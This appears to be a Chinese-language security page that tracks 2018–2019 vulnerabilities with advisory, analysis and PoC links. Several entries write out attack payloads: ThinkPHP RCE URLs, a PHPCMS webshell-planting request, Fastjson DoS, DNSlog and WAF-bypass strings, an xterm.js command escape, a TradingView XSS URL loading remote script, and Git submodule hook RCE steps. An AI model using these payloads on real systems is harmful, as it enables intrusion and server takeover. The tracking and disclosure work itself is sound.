---
layout: page
title: Latest Vulnerabilities
description: "Latest Security Vulnerabilities"
image:
  feature: abstract-11.jpg
share: true
---

2019
---
1. **【20191119】Apache Solr默认配置对外开放JMX端口导致命令执行CVE-2019-12409**
    - <https://www.mail-archive.com/announce@apache.org/msg05559.html>
    - 8.1.1和8.2.0版本中默认配置文件solr.in.sh中`ENABLE_REMOTE_JMX_OPTS`默认设置为true，会开放JMX服务，将RMI端口暴露，从而导致命令执行。默认端口为18983。
    - 利用工具：mjet

1. **【20191112】Flink未鉴权RCE**
    - 未鉴权的Flink Dashboard可以提交任务，可以提交恶意的jar包来执行命令。
    - PoC：<https://github.com/LandGrey/flink-unauth-rce>

1. **【20191107】Squid缓冲区溢出远程代码执行CVE-2019-12526**
    - Squid发布了新版本4.9，新版本修复了远程溢出漏洞CVE-2019-12526 <http://www.squid-cache.org/Advisories/SQUID-2019_7.txt>
    - 早在 2019-07-12 Squid官方发布安全公告CVE-2019-12527，<http://www.squid-cache.org/Advisories/SQUID-2019_5.txt>
    - CVE-2019-12527漏洞分析及PoC片段：<https://mp.weixin.qq.com/s/7oSuurI_h04GacLVOckaxQ>
    - 2019-08-22 趋势科技发布CVE-2019-12527研究报告： <https://www.thezdi.com/blog/2019/8/22/cve-2019-12527-code-execution-on-squid-proxy-through-a-heap-buffer-overflow>

1. **【20191031】Apache Solr Velocity模版注入RCE漏洞**
    - <https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt>

1. **【20191023】Apache Shiro Padding Oracle漏洞**
    - 在获取一个有效的rememberme的情况下，通过PaddingOracle构造恶意的rememberme实现反序列化利用。
    - 分析: <https://www.anquanke.com/post/id/192819>
    - Issue: <https://issues.apache.org/jira/browse/SHIRO-721>
    - 描述：1. 需要合法的Cookie然而很多业务Cookie里没有rememberMe 2. Padding Oracle依赖页面返回信息来进行侧信道攻击 3. 需要目标环境存在反序列化Gadget
    - 关于PaddingOracle：<http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html>

1. **【20191023】PHP远程命令执行漏洞CVE-2019-11043**
    - <https://bugs.php.net/bug.php?id=78599>
    - <https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/>
    - <https://github.com/neex/phuip-fpizdam>

1. **【20191017】Kibana < 6.6.0 控制台命令执行漏洞**
    - <https://mp.weixin.qq.com/s/R4rzYDp9-q2NYAOvPK951A>

1. **【20191010】iTerm2存在严重漏洞可导致远程命令执行**
    - <https://blog.mozilla.org/security/2019/10/09/iterm2-critical-issue-moss-audit/>
    - 影响3.3.6以下版本

1. **【20190905】FastJson拒绝服务漏洞 影响版本<1.2.60**
    - FastJson在处理\x转义字符时没有进行格式判断，攻击者可以向服务器发送恶意请求，导致CPU/RAM过载。
    - PoC：`{"a":"\x"}`

1. **【20190814】MSCTF提权漏洞，影响XP到Win10所有版本**
    - https://thehackernews.com/2019/08/ctfmon-windows-vulnerabilities.html
    - https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html
    - <https://github.com/taviso/ctftool>
    - <https://bugs.chromium.org/p/project-zero/issues/detail?id=1859>

1. **【20190814】Windows RDP蠕虫漏洞CVE-2019-1181、CVE-2019-1182**
    - <http://blog.nsfocus.net/cve-2019-1181cve-2019-1182/>

1. **【20190801】Apache Slor RCE CVE-2019-0193**
    - 在Apache Solr中，DataImportHandler是一个可选但常用的模块，由于DIH配置可以包含脚本，因此dataConfig参数存在安全风险。而从Solr的8.2.0版开始，使用此参数需要将Java System属性enable.dih.dataConfigParam设置为true，并不能直接触发。
    - <https://issues.apache.org/jira/browse/SOLR-13669>
    - <https://www.jianshu.com/p/11ac6c7f4835>
    - <https://www.anquanke.com/post/id/184151>

1. **【20190730】iMessage远程获取文件CVE-2019-8646**
    - <https://bugs.chromium.org/p/project-zero/issues/detail?id=1858>

1. **【2019-07-22】ProFTPd任意文件拷贝漏洞CVE-2019-12815**
    - 需要登录或者匿名账号
    - 官方补丁<https://github.com/proftpd/proftpd/pull/816>
    - 官方漏洞信息<http://bugs.proftpd.org/show_bug.cgi?id=4372>

1. **【2019-07-10】Fastjson反序列化命令执行，1.2.48以下Autotype绕过**
    - com.alibaba.fastjson.serializer.MiscCodec 定义了特定class的序列化与反序列化逻辑，包括java.lang.Class等。利用java.lang.Class可以实例化 com.sun.rowset.JdbcRowSetImpl。由于Fastjson的缓存特性，在利用com.sun.rowset.JdbcRowSetImpl进行JNDI注入时，直接从缓存表中取对象实例，则可以绕过autotype限制。
    - PoC: <https://raw.githubusercontent.com/kxcode/snippet/master/FastJson1.2.47.txt>
    - 检测：java.net.InetAddress类在fastjson 1.2.48中被加入了autotype黑名单，如果dnslog服务器成功收到请求，则说明目标fastjson版本低于1.2.48。Payload如下：`{"@type":"java.net.InetAddress","val":"inetaddress.fastjson.rxxoow.ceye.io"}`
    - WAF绕过：`@type`关键字可以用`\u0040type`绕过
    - 总结：<https://www.freebuf.com/vuls/208339.html>
    
1. **【20190615】Weblogic漏洞CVE-2019-2725绕过**
    - TODO

1. **【20190615】Windows NTLM认证漏洞CVE-2019-1040**
    - 域提权深度分析 <https://mp.weixin.qq.com/s/NEBi8NflfaEDL2qw1WIqZw>

1. **【20190522】Windows10提权0day**
    - Twitter：<https://twitter.com/dangoodin001/status/1131345555186077697>
    - US Cert公告：<https://kb.cert.org/vuls/id/119704/>
    - PoC: <https://github.com/SandboxEscaper/polarbearrepo/tree/master/sandboxescape>

1. **【20190515】Windows RDP远程命令执行CVE-2019-0708**
    - Windows RDP远程桌面存在远程命令执行漏洞。
    - 影响：Windows XP/2003/7/Server 2008/Server 2008R2
    - 漏洞分析：<https://www.anquanke.com/post/id/178964>
    - 漏洞远程扫描：<https://github.com/zerosum0x0/CVE-2019-0708>
    - 跟踪报道：<https://www.anquanke.com/post/id/178966>
    - 漏洞分析：[深信服千里目](https://mp.weixin.qq.com/s?__biz=MzI4NjE2NjgxMQ==&mid=2650238047&idx=1&sn=0d9d727c877f05afebab54c38893852c&chksm=f3e2d62bc4955f3dbde5e58adccf8045ba9413d949b8fa62752c6d06e19ec14d0eea2b0d2bf7#rd)
    - ZDI漏洞分析：<https://www.thezdi.com/blog/2019/5/27/cve-2019-0708-a-comprehensive-analysis-of-a-remote-desktop-services-vulnerability>

1. **【20190418】Weblogic反序列化命令执行漏洞 CVE-2019-2725**
    - 公告：<https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html>
    - 预警：<http://blog.nsfocus.net/weblogic-ns-2019-0015/>
    - 分析：<https://www.anquanke.com/post/id/177381>
    - 老POC：未绕过CVE-2017-10271 <https://github.com/No4l/MyTools/commit/9943385596143ac9e906354a7c1b42b5570e669f>
    - 新POC：Weblogic10 -> toplink， Weblogic12 -> slf4j ，通用：JNDI JdbcRowSetImpl

1. **【20190406】Apache Confluence命令执行漏洞 CVE-2019-3395 CVE-2019-3396**
    - 公告：<https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html>
    - 漏洞分析：<https://paper.seebug.org/884/>
    - 描述：Confluence通常是一个用于企业内部的知识库和Wiki工具，在服务端模板渲染时存在漏洞，可导致任意文件读取、远程对象加载和RCE。漏洞点处在Widget Connector（小工具连接器）这个功能上。用户在创建文档时，可以在文章中嵌入一些视频、文档之类的（比如：Youtube视频、Flickr幻灯片、Google文档等内容），服务端会根据用户传入的远程资源URL进行渲染，此时用户可以手工传入`_template`参数，指定服务端模板文件，使服务端加载恶意的远程模板文件，在模板文件中利用Java反射达到命令执行的效果（模板引擎是velocity）。也可以将`_template`设置为服务器上的文件，从而读取文件内容，如：`/WEB-INF/web.xml`或者`../web.xml`。
    - POC <https://github.com/kxcode/snippet/blob/master/CVE-2019-3396.md>
    - 影响范围： <https://www.freebuf.com/news/200183.html>
    - 漏洞利用不需要登录

1. **【20190403】Apache Http Server提权漏洞 CVE-2019-0211**
    - 分析 <https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html>
    - Exploit <https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache>
    - 影响范围 2.4.17 ~ 2.4.28
    
1. **【20190307】Apache Solr 命令执行漏洞 CVE-2019-0192**
    - POC <https://github.com/mpgn/CVE-2019-0192>
    - Bug单 <https://issues.apache.org/jira/browse/SOLR-13301>
    - 描述：攻击者可以通过Solr的HTTP Config API将Solr的JMX服务指向一个恶意的RMI服务，利用Solr不安全的反序列化功能，达到RCE的危害。
    - 影响版本：5.0.0 ~ 5.5.5、6.0.0 ~ 6.6.5
    - 安全版本：7.0

1. **【20190307】Chrome 'FileReader' Use After Free命令执行漏洞CVE-2019-5786**
    - <https://twitter.com/justinschuh/status/1103087046661267456>
    - 影响范围：Chrome < 72.0.3626.121 或者 Chromium < 74.0.3721.0
    - 代码Diff：<https://chromium.googlesource.com/chromium/src/+/150407e8d3610ff25a45c7c46877333c4425f062%5E%21/#F0>
    - 新闻报道：
    - <https://nakedsecurity.sophos.com/2019/03/06/serious-chrome-zero-day-google-says-update-right-this-minute/>
    - <https://www.securityfocus.com/bid/107213>
    - <https://www.solidot.org/story?sid=59806>
    - <https://www.leiphone.com/news/201903/CzzG8lN74hZ3dUwK.html>
    - 漏洞分析 <https://www.anquanke.com/post/id/173681>
    - POC <https://github.com/exodusintel/CVE-2019-5786>
    - Exp <https://github.com/exodusintel/Chromium-941743>

1. **【20190221】WinRAR命令执行漏洞CVE-2018-20250, CVE-2018-20251, CVE-2018-20252, CVE-2018-20253**
    - Extracting a 19 Year Old Code Execution from WinRAR<https://research.checkpoint.com/extracting-code-execution-from-winrar/>
    - POC:<https://github.com/Ridter/acefile>

1. **【20190220】Wordpress5.0.0命令执行漏洞**
    - <http://www.4hou.com/vulnerable/16282.html>

1. **【20190213】Nexus Repository Manager 3 访问控制缺失及远程代码执行CVE-2019-7238**
    - <https://cloud.tencent.com/announce/detail/459>

1. **【20190213】runc Docker逃逸漏洞CVE-2019-5736**
    - 分析：<http://blog.nsfocus.net/runc-cve-2019-5736/>
    - PoC：<https://github.com/q3k/cve-2019-5736-poc>

1. **【20190124】Numpy库存在反序列化命令执行漏洞CVE-2019-6446**
    - <https://www.bleepingcomputer.com/news/security/numpy-is-awaiting-fix-for-critical-remote-code-execution-bug/>

1. **【20190122】apt/apt-get 远程命令执行漏洞披露（CVE-2019-3462）**
    - <https://justi.cz/security/2019/01/22/apt-rce.html>
    - <https://www.anquanke.com/post/id/170090>
    
1. **【20190115】ThinkPHP 5.1~5.2 RCE漏洞**
    - ThinkPHP 5.0.x-5.0.23、5.1.x、5.2.x 全版本远程代码执行漏洞分析 <http://blog.nsfocus.net/thinkphp-full-version-rce-vulnerability-analysis/>
    - POC合集：<https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection>

1. **【20190110】xterm.js 命令执行漏洞CVE-2019-0542**
    - POC：`echo -e "abcdef\x1bP+qfoo;\ntouch /tmp/foo;aa\n\x1b\n"`
    - 在xterm终端下可逃逸并执行命令。利用场景：受害者执行curl http://xxx/xxx.txt，服务端返回的内容包含上述特殊字符，于是回显的数据逃逸了xterm的终端，并额外执行了命令。


2018
---
1. **【20181221】Windows越权任意文件读取0day**
    - <https://thehackernews.com/2018/12/windows-zero-day-exploit.html>
    - <https://sandboxescaper.blogspot.com/2018/12/readfile-0day.html>

1. **【20181220】微软发布补丁修复一个在野利用的IE漏洞 CVE-2018-8653**
    - <https://www.cnbeta.com/articles/tech/800317.htm>
    - <https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-8653>

1. **【20181210】ThinkPHP发布V5.1.31、V5.0.23安全更新，修复Getshell漏洞**
    - <https://mp.weixin.qq.com/s?__biz=MjM5OTEzMzQwMA==&mid=2651667456&idx=1&sn=746ee2b9aa2b02f6ff60ff906ec2939a>
    - 受影响版本包括：V5.0.*、V5.1.*
    - 修复的版本：V5.1.31、V5.0.23
    - /public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=321
    - /public/index.php?s=index/\think\view\driver\Php/display/%3E&content=aaa%3C?php%20phpinfo();?%3E

1. **【20181205】Kubernetes API特权提升漏洞CVE-2018-1002105**
    - <https://github.com/kubernetes/kubernetes/issues/71411>

1. **【20181205】Flash命令执行漏洞CVE-2018-15982**
    - 释放后重用，任意代码执行。
    - <http://blog.nsfocus.net/adobe-flash-player-cve-2018-15982/>
    - 攻击事件分析：<https://www.freebuf.com/column/191383.html>
    - POC：<https://github.com/B1eed/VulRec/tree/master/CVE-2018-15982>

1. **【20181128】PHPCMS 2008 任意文件写入 RCE CVE-2018-19127**
    - 描述：发恶意包：`/type.php?template=tag_(){};@unlink(FILE);assert($_POST[1]);{//../rss`Shell落在这个文件：`/cache_template/rss.tpl.php` 内容：`"@unlink(FILE);assert($_POST[1]);"`
    - <http://www.yncert.org.cn/article/show/8119.html>
    - <https://github.com/ab1gale/phpcms-2008-CVE-2018-19127>

1. **【20181127】Consul服务接口存在RCE漏洞**
    - 官方公告：<https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations>
    - 描述： Consul的早期版本中HTTP API没有进行访问控制，可以用来执行命令。Consul 和 zookeeper 及 etcd 类似常用于分布式系统，HashiCorp公司推出的开源工具，用于实现分布式系统的服务发现与配置。问题出在老版本的默认配置（新版本已经改成可选配置）, server 和 client 会开放 8500 端口作为 web api，默认没有鉴权，v1/agent/service/register，v1/session/create 等接口都可用于执行命令。
    - PoC：<https://packetstormsecurity.com/files/150940/consul_service_exec.rb.txt>

1. **【20181113】严重，Exchange Server账号冒用，盗用任意用户邮件CVE-2018-8581**
    - <https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8581>
    - POC：<https://github.com/thezdi/PoC/tree/master/CVE-2018-8581>
    - POC：<https://github.com/WyAtu/CVE-2018-8581>
    - 分析CVE-2018-8581：在Microsoft Exchange上冒充用户 <https://www.anquanke.com/post/id/168337>
    - 分析CVE-2018-8581：<https://xz.aliyun.com/t/3670>
    - 新的攻击手法，可以拿域控：<https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/>
    - 利用同样的方式拿到EWS Hash，通过这个Hash进行NTLM中继，攻击域控ldap，给指定用户提权，通过dscync导出人以用户Hash。
    - 补丁：<https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2019-0686>

1. **【20181106】GOGS/Gitea任意代码执行(CVE-2018-18925/6)及利用流程**
    - 漏洞分析：<https://xz.aliyun.com/t/3168> <https://www.anquanke.com/post/id/163575>
    - Gogs 是一款极易搭建的自助 Git 服务。 Gogs 的目标是打造一个最简单、最快速和最轻松的方式搭建自助 Git 服务，使用 Go 语言开发。
    - Gitea是从Gogs发展而来，同样的拥有极易安装，运行快速的特点，而且更新比Gogs频繁很多，维护的人也多。

1. **【20181106】Struts 2.3.36使用了1.3.2版本的commons-fileupload组件，存在反序列化命令执行漏洞**
    - 描述：2017-06-20 Struts 2.5.12已经使用了1.3.3版本的commons-fileupload组件 <https://issues.apache.org/jira/browse/WW-4812
>
    - US-CERT公告：<https://www.us-cert.gov/ncas/current-activity/2018/11/05/Apache-Releases-Security-Advisory-Apache-Struts>
    - 开发者邮件：<http://mail-archives.us.apache.org/mod_mbox/www-announce/201811.mbox/%3CCAMopvkMo8WiP%3DfqVQuZ1Fyx%3D6CGz0Epzfe0gG5XAqP1wdJCoBQ%40mail.gmail.com%3E>
    - NVD漏洞公告：2016-10-25 <https://nvd.nist.gov/vuln/detail/CVE-2016-1000031>
    - 官方漏洞公告：2016-11-04 <https://issues.apache.org/jira/browse/FILEUPLOAD-279>
    - 漏洞分析 By Tenable：<https://www.tenable.com/security/research/tra-2016-12>
    - 漏洞分析：<https://blog.spoock.com/2018/10/15/cve-2016-1000031/>
    - 影响版本：commons-fileupload 1.3.2及以下版本
    - 时间线：
        2014-02-07 FileUpload 1.3.1 发布 
        2016-05-26 FileUpload 1.3.2 发布
        2016-10-25 NVD漏洞分析 <https://nvd.nist.gov/vuln/detail/CVE-2016-1000031>
        2016-11-04 Commons FileUpload 官方公告 CVE-2016-1000031 <https://issues.apache.org/jira/browse/FILEUPLOAD-279>
        2017-06-13 FileUpload 1.3.3 发布
        2017-06-20 Struts 2.5.12 将内置commons-fileupload组件更新到1.3.3
        
1. **【20181019】Oracle Weblogic远程代码执行漏洞CVE-2018-3191**
    - 描述：这个漏洞利用的gadget是weblogic中自带的，跟JDK版本无关，所以只要系统能连外网，未禁止T3协议，漏洞就可以利用，威力巨大。
    - 漏洞分析：<https://www.anquanke.com/post/id/162274>

1. **【20181017】LibSSH 0.6及更高版本认证绕过漏洞**
    - https://www.libssh.org/2018/10/16/libssh-0-8-4-and-0-7-6-security-and-bugfix-release/
    - <https://mp.weixin.qq.com/s/mzxaX6g6Iq0ihQwrf6l8Mw>
    - [MSF Exploit](https://github.com/rapid7/metasploit-framework/blob/22503209d9b8aa0a0e21ed60d9a0af7f1f2182f4/modules/auxiliary/scanner/ssh/libssh_auth_bypass.rb
https://github.com/rapid7/metasploit-framework/blob/22503209d9b8aa0a0e21ed60d9a0af7f1f2182f4/lib/msf/core/exploit/ssh/auth_methods.rb)

1. **【20181010】GhostScript命令执行漏洞Bypass CVE-2018-17961**
    - 描述：<https://seclists.org/oss-sec/2018/q4/28>
    - POC：<https://bugs.chromium.org/p/project-zero/issues/detail?id=1682&desc=2>

1. **【20181009】CVE-2018-8453 Win32k Elevation of Privilege Vulnerability**
    - Zero-day exploit (CVE-2018-8453) used in targeted attacks <https://securelist.com/cve-2018-8453-used-in-targeted-attacks/88151/>

1. **【20181007】MikroTik RouterOS未授权文件读取到GetShell**
    - https://www.freebuf.com/vuls/187272.html

1. **【20180930】GoogleProjectZero Linux内核提权 VMA-UAF 漏洞CVE-2018-17182**
    - <https://github.com/jas502n/CVE-2018-17182>
    - Linux内存管理子系统中的缓存失效错误，导致释放后使用漏洞。

1. **【20180919】交易前端图表通用JS组件 Tradingview 存在XSS漏洞**
    - POC：<http://topbtc.com/tradingview/charting_library/static/tv-chart.e816a7a6edc9de3ed709.html#enabledFeatures=[]&disabledFeatures=[]&indicatorsFile=https://kingx.me/p/x.js>
    - 分析：通用K线展示JS库 TradingView 存在 XSS漏洞 <https://mp.weixin.qq.com/s/yfbKf_5Nk2NXFl2-xlFqKg>
    - 漏洞文件：tv-chart.js 或者 library.xxxxxx.js

1. **【20180912】Microsoft XML Core Services MSXML Remote Code Execution CVE-2018-8420**
    - POC：<https://github.com/Theropord/CVE-2018-8420/>
    - 公告：<https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8420>
    - 实测PoC：<https://github.com/kxcode/snippet/blob/master/CVE-2018-8420.md>
    - 描述：需要更改IE默认配置，IE安全设置-Internet区域，设置“对未标记为可安全执行脚本的ActiveX空间初始化并执行”为启用（不安全）。

1. **【20180905】ECShop全版本命令执行漏洞**
    - 分析：<https://paper.seebug.org/695/>

1. **【20180829】Windows ALPC 本地提权 CVE-2018-8440**
    - <https://www.kb.cert.org/vuls/id/906424>
    - <https://github.com/SandboxEscaper/randomrepo/blob/master/PoC-LPE.rar>
    - <https://twitter.com/SandboxEscaper/status/1034125195148255235>
    - <https://doublepulsar.com/task-scheduler-alpc-exploit-high-level-analysis-ff08cda6ad4f>
    - <https://github.com/GossiTheDog/zeroday/tree/master/ALPC-TaskSched-LPE>
    - POC分析：<http://www.qingpingshan.com/m/view.php?aid=394126>
    - 描述：提权之后，系统上会残留一些文件，C:\Windows\Tasks\UpdateTask.job、C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_4592475aca2acf83\Amd64\PrintConfig.dll。当新建excel，然后点击字体选择下拉选框按钮时，会触发执行。

1. **【20180822】UEditor两个版本上传漏洞**
    - <http://www.freebuf.com/vuls/181814.html>

1. **【20180822】Struts2 命令执行漏洞 S2-057 CVE-2018-11776**
    - 公告：<https://cwiki.apache.org/confluence/display/WW/S2-057>
    - 作者博客：<https://lgtm.com/blog/apache_struts_CVE-2018-11776>
    - 国内分析：<https://xz.aliyun.com/t/2618>
    ````````````````````````
1. **【20180822】GhostScript沙盒绕过命令执行，影响ImageMagick CVE-2018-16509**
    - USCERT：<https://www.kb.cert.org/vuls/id/332928>
    - seclist：<http://seclists.org/oss-sec/2018/q3/144>
    - PoC: <https://github.com/kxcode/snippet/blob/master/GhostScript.txt>

1. **【201808】Windows提权 CVE-2018-8120**
    - Exp：<https://github.com/alpha1ab/CVE-2018-8120/tree/master/CVE-2018-8120>

1. **【20180817】在野利用的 VBScript 引擎 UAF 漏洞 CVE-2018-8373**
    - https://blog.trendmicro.com/trendlabs-security-intelligence/use-after-free-uaf-vulnerability-cve-2018-8373-in-vbscript-engine-affects
    -internet-explorer-to-run-shellcode/
    - <https://www.freebuf.com/column/190504.html>
    - 利用CVE-2018-8373 0day漏洞的攻击与Darkhotel团伙相关的分析 <https://ti.360.net/blog/articles/analyzing-attack-of-cve-2018-8373-and-darkhotel/>

1. **【20180815】OpenSSH用户枚举漏洞CVE-2018-15473**
    - 描述：OpenSSH 7.7及之前版本中存在用户枚举漏洞，该漏洞源于程序会对有效的和无效的用户身份验证请求发出不同的响应。攻击者可通过发送特制的请求利用该漏洞枚举用户名称。
    - POC：

1. **【20180815】Microsoft Exchange Server 远程代码执行 CVE-2018-8302**
    - 微软公告：<https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2018-8302>
    - 趋势分析：<https://www.thezdi.com/blog/2018/8/14/voicemail-vandalism-getting-remote-code-execution-on-microsoft-exchange-server>

1. **【20180815】Intel CPU再爆芯片级漏洞 L1TF推测执行侧信道攻击漏洞 (L1 Terminal Fault Speculative)**
    - CVE：CVE-2018-3615、CVE-2018-3620、CVE-2018-3646
    - Intel官方公告：<https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00161.html>
    - 谷歌公告：<https://cloud.google.com/blog/products/gcp/protecting-against-the-new-l1tf-speculative-vulnerabilities>
    - Intel分析：<https://www.intel.com/content/www/us/en/architecture-and-technology/l1tf.html>
    - Xen公告：<http://xenbits.xen.org/xsa/advisory-273.html>
    - RedHat公告：<https://www.redhat.com/archives/rhsa-announce/2018-August/msg00012.html>

1. **【20180801】HP Ink Printers Remote Code Execution CVE-2018-5924, CVE-2018-5925**
    - 细节：<https://research.checkpoint.com/sending-fax-back-to-the-dark-ages/>
    - 报道：<https://threatpost.com/def-con-2018-critical-bug-opens-millions-of-hp-officejet-printers-to-attack/134972/>

1. **【20180808】Linux内核DoS漏洞 SegmentSmack CVE-2018-5390**
    - CVE-2018-5390

1. **【20180725】Jenkens任意文件读取漏洞 CVE-2018-1999002**
    - 官方公告：<https://jenkins.io/security/advisory/2018-07-18/>
    - PoC：<https://codegists.com/snippet/python/cve-2018-1999002py_becojo_python>

1. **【20180718】Weblogic未授权任意文件上传 CVE-2018-2894**
    - <https://mp.weixin.qq.com/s/8fm916rtAwz_LUSbyZ7M6Q>
    - PoC：<https://github.com/LandGrey/CVE-2018-2894>

1. **【20180718】Weblogic反序列化漏洞 CVE-2018-2893**
    - <https://www.anquanke.com/post/id/152164> 
    - 描述：CVE-2018-2628修复不完善，可以被绕过。
    - <https://github.com/tdy218/ysoserial-cve-2018-2628>

1. **【20180703】Wechat Pay SDK XXE漏洞**
    - 漏洞详情：<http://seclists.org/fulldisclosure/2018/Jul/3>


1. **【20180604】Microsoft JScript命令执行漏洞 CVE-2018-8267**
    - <https://www.zerodayinitiative.com/advisories/ZDI-18-534/>
    - <http://www.freebuf.com/articles/system/174187.html>

1. **【20180605】Zip Slip漏洞**
    - 和五月份的ZipperDown漏洞差不多
    - <https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf>
    - <https://snyk.io/research/zip-slip-vulnerability>
    - 受影响库列表：<https://github.com/snyk/zip-slip-vulnerability>

1. **【20180601】 Git submodule RCE漏洞 CVE-2018-11235**
    - 描述：Git没有对子模块名称进行过滤，存在目录穿越漏洞。攻击者可以通过配置恶意的.gitmodules文件，将Git Hooks脚本文件推送到了客户端中，当用户在使用'git clone --recurse-submodules'时，触发RCE。
    - 漏洞点说明：通过路径穿越，可以设置任意目录为子模块的`.git`目录。而在这一目录下放入hooks/post-checkout等恶意hooks脚本，即可达到RCE的效果。
    - 漏洞分析：<https://xz.aliyun.com/t/2371>
    - 漏洞分析：<https://staaldraad.github.io/post/2018-06-03-cve-2018-11235-git-rce/>
    - 漏洞分析：<https://atorralba.github.io/CVE-2018-11235/>
    - POC：<https://github.com/Rogdham/CVE-2018-11235>
    - 影响范围： Git version < 2.13.7、Git version 2.14.x < 2.14.4、Git version 2.15.x < 2.15.2、Git version 2.16.x < 2.16.4、Git version 2.17.x < 2.17.1
    - 修复版本：Git version 2.14.4、2.15.2、2.16.4、2.17.1
    - 前置知识：
        1. `.git/hooks`文件夹下存放了[Git Hooks](https://git-scm.com/book/zh/v1/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git%E6%8C%82%E9%92%A9)脚本，本质上就是Shell脚本，在某些情况下会被Git调用。比如：在执行`git checkout`时会自动调用`post-checkout`脚本。这些Hooks脚本存放在客户端，clone项目时不会传递这些hook脚本。
        2. 主项目根目录的子模块文件夹下有一个`.git`文件，文件内容是这个子模块的`.git`目录路径。而这个路径通常指向了主项目的`.git/modules`目录，该目录下每一个文件夹对应的存放了各个子模块的`.git`目录的文件。而Git在解析`.gitmodules`文件时，会把子模块的名称，拼接到`.git/modules/`后面，当作子模块的`.git`目录路径。也就是这里导致了本次RCE漏洞。
        3. `.gitmodules`文件说明：<https://git-scm.com/docs/gitmodules>
        4. Git子模块工具：<https://git-scm.com/book/en/v2/Git-Tools-Submodules>

    - 利用流程：
        1. 创建恶意项目`repo`
        2. 添加一个恶意的子模块，命名为evil。`git submodule add some_repo_address evil`
        3. 将目录`.git/modules/evil`拷贝到主项目根目录的`testdir/evil`文件夹下。
        4. 往`testdir/evil`目录中的hooks目录添加恶意hook脚本。
        5. 配置`.gitmodules`，设置子模块的update参数为checkout，从而在子模块update时触发post-checkout脚本。（注：If you pass `--recurse-submodules` to the git clone command, it will automatically initialize and update each submodule in the repository.）
        6. 配置`.gitmodules`，使子模块的`name`为`../../testdir/evil`，使子模块的Git目录指向主项目根目录下的`testdir/evil`。
        7. 受害者`git clone --recurse-submodules repo`时触发RCE。


1. **【20180529】EOS节点代码执行漏洞**
    - 描述：EOS区块链系统在解析智能合约WASM文件时的一个越界写缓冲区溢出漏洞。攻击者可以上传恶意的智能合约至节点服务器，在节点服务器解析恶意合约后，攻击者就能够在节点服务器上执行任意代码并完全控制服务器。
    - PR文章：<https://mp.weixin.qq.com/s/nFBxMrl7QMeuFLt2AA6u4Q>
    - 漏洞分析：<http://blogs.360.cn/blog/eos%E8%8A%82%E7%82%B9%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/>
    - 复盘：<https://mp.weixin.qq.com/s/rnZlocdFgA0g2CSDRv31Cw>

1. **【20180516】DHCP命令注入漏洞**
    - <https://www.youtube.com/watch?v=LuD_7ud0XyM&feature=youtu.be>
    - POC：<https://github.com/kxcode/snippet/blob/master/DHCP-Injection.txt>

1. **【20180515】内核提权漏洞，程序员误读Intel文档 CVE-2018-8897 CVE-2018-1087**
    - 漏洞分析：<https://mp.weixin.qq.com/s/xVudsIFermEYRJ7fN-qK-w>
    - Arbitrary code execution with kernel privileges using CVE-2018-8897
    - PoC：<https://github.com/can1357/CVE-2018-8897>

1. **【20180515】盘古发现ZipperDown漏洞**
    - 漏洞公告：<https://mp.weixin.qq.com/s/SMpBQ4mZQLVLfgK7f84OYA>
    - 描述：WiFi劫持+解压+路径穿越
    - 漏洞Issue：<https://github.com/ZipArchive/ZipArchive/issues/453>

1. **【20180512】Node Security - macaddress模块存在命令执行漏洞**
    - Node Security Platform | Advisory <https://nodesecurity.io/advisories/654>
    - 报告：<https://hackerone.com/reports/319467>

1. **【20180508】CVE-2018-0824 | Microsoft Windows COM 远程命令执行漏洞**
    - 该漏洞可远程调用一个计算机上的COM组件，根据内容分析，作者给出的POC无法对远程主机进行复现，是由于在调用CoGetInstanceFromIStorage()时未传递计算机名（COSERVERINFO），我们可以将调用COM组件的程序嵌入office或网页中，也能够获取目标主机的系统权限。 
    - 影响：Microsoft Windows Server 2008 Microsoft Windows Server 2008 R2 Microsoft Windows 7 Microsoft Windows Windows Server 2012 Microsoft Windows 8.1 Microsoft Windows Server 2012 R2 Microsoft Windows RT 8.1 Microsoft Windows 10 Microsoft Windows Server 2016 
    - 分析文章：https://codewhitesec.blogspot.com/2018/06/cve-2018-0624.html 
    
1. **【20180508】Windows VBScript引擎远程执行代码漏洞 CVE-2018-8174**
    - 描述：VBScript引擎处理内存中对象的方式中存在一个远程执行代码漏洞。该漏洞可能以一种攻击者可以在当前用户的上下文中执行任意代码的方式来破坏内存。成功利用此漏洞的攻击者可以获得与当前用户相同的用户权限。
    - <https://www.freebuf.com/column/188622.html>

1. **【20180502】7-Zip命令执行漏洞（CVE-2018-10115）**
    - 分析：<https://landave.io/2018/05/7-zip-from-uninitialized-memory-to-remote-code-execution/>

1. **【20180418】Weblogic 反序列化远程代码执行漏洞 CVE-2018-2628**
    - 描述：<http://blog.nsfocus.net/cve-2018-2628/>
    - 漏洞分析：<https://mp.weixin.qq.com/s/-HuQA2KfGB_rAG4VasTUhQ>
    - POC：<https://github.com/brianwrf/CVE-2018-2628>
    - 分析：<http://www.freebuf.com/vuls/169420.html>
    - 分析：<https://paper.seebug.org/584/>
